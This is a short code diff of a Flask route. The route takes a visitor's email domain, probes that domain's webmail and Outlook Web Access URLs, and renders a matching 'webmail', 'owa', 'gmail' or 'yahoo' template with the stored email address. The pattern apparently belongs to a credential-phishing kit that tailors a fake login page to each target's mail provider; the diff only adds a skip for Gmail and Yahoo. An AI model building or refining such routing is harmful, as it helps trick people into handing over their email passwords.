@@ -193,33 +193,34 @@ def route2():
     elif domain == "yahoo.com":
         return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
     
-    # Define Webmail & OWA URLs
-    webmail_url = f"https://{domain}/webmail"
-    owa_urls = [
-        urljoin(f"https://owa.{domain}", "/owa/#path=/mail"),
-        urljoin(f"https://autodiscover.{domain}", "/owa/#path=/mail/search"),
-    ]
+    # Define Webmail & OWA URLs (Skipping check for Gmail and Yahoo)
+    if domain not in ["gmail.com", "yahoo.com"]:
+        webmail_url = f"https://{domain}/webmail"
+        owa_urls = [
+            urljoin(f"https://owa.{domain}", "/owa/#path=/mail"),
+            urljoin(f"https://autodiscover.{domain}", "/owa/#path=/mail/search"),
+        ]
 
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
 
-    # Function to check if a URL returns status code 200
-    def is_accessible(url):
-        try:
-            response = requests.get(url, headers=headers, timeout=10)
-            if response.status_code == 200:
-                return True
-        except requests.RequestException:
-            pass
-        return False
+        # Function to check if a URL returns status code 200
+        def is_accessible(url):
+            try:
+                response = requests.get(url, headers=headers, timeout=10)
+                if response.status_code == 200:
+                    return True
+            except requests.RequestException:
+                pass
+            return False
 
-    # Check Webmail
-    if is_accessible(webmail_url):
-        return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
+        # Check Webmail
+        if is_accessible(webmail_url):
+            return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
 
-    # Check OWA
-    for owa_url in owa_urls:
-        if is_accessible(owa_url):
-            return render_template('owa.html', eman=session['eman'], ins=session['ins'])
+        # Check OWA
+        for owa_url in owa_urls:
+            if is_accessible(owa_url):
+                return render_template('owa.html', eman=session['eman'], ins=session['ins'])
     
     # Default if no match, passing variables to index.html
     return render_template('index.html', eman=session.get('eman', ''), ins=session.get('ins', ''))
